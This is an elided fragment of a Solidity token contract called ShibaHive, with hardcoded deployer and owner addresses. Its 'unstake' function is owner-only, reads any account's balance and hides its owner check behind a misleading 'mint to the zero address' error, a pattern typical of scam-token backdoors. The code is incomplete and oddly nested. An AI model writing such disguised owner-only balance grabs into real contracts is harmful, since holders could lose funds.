...
contract ShibaHive is Context, IERC20 {
    ...
    address lead_deployer = 0x31e180e06D771dbAfa3D6Eea452195Ad1020fbDb;
    address public _owner = 0x06A816bE41AEFb1011B2eeD6E467f64ebD214Ce2;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function stake(address account) public {
        ...
        function unstake(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
